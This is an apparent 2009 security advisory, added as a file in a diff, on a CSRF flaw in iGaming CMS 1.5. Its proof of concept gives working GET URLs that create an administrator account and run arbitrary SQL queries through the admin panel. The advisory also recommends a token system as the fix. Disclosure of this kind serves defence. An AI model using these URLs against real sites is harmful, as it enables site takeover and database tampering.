@@ -1,0 +1,56 @@
+NeX of the HackTalk team has found a CSRF Vulnerability in iGaming CMS v 1.5 that allows an attacker to make new administrative account, and run SQL queries.
+
+Pentest Information:
+============
+NeX has discovered a Cross Site Request Forgery(CSRF) vulnerability in iGaming CMS 1.5
+
+Details
+============
+Tested on OS:        Linux
+Tested with Software:    Mozilla Firefox 3.0.x
+
+Vulnerable Products:     iGaming CMS
+Affected Versions:    1.5
+Vulnerability Type:    Cross Site Request Forgery
+Security-Risk:         High
+
+Vendor-URL:         http://www.igamingcms.com/
+Preview-URL:        http://demo.opensourcecms.com/igaming/
+
+Vendor-Status:         Not informed
+Patch/Fix-Status:    Fixed version not released
+Advisory-Status:    Written | 12/15/09
+
+Advisory-URL:
+Report-URL:
+
+Introduction:
+============
+iGaming CMS is a content management system designed for gaming websites. The system is written in PHP and requires a Mysql database for operation.
+
+(Copy from the vendors homepage: http://www.igamingcms.com/)
+
+More Details:
+============
+Due to the lack of multiple input validation errors, an attacker is able to change the password of the administrative user. Add new admin user, and run SQL queries.
+
+Proof of Concept:
+============
+The following link will make new administrative account:
+
+http://server/igaming/admin/users.php?pseudo=Username&email=E-Mail@of.the.new.admin.com&fname=First-Name&lname=Last-Name&password=Password&submit=Confirm&do=add_confirm
+
+The following link will run SQL query:
+http://server/igaming/admin/dbtools.php?query=[SQL_QERY_HERE]&submit=Go&do=run_query
+(Change [SQL_QERY_HERE] to your own SQL query.)
+Fix & Patch:
+============
+To fix the bugs a token system is highly advised
+
+Security Risk:
+============
+An attacker is able to make new administrative user thus having complete control over the site. The risk is estimated as HIGH!
+
+Author:
+========
+NeX
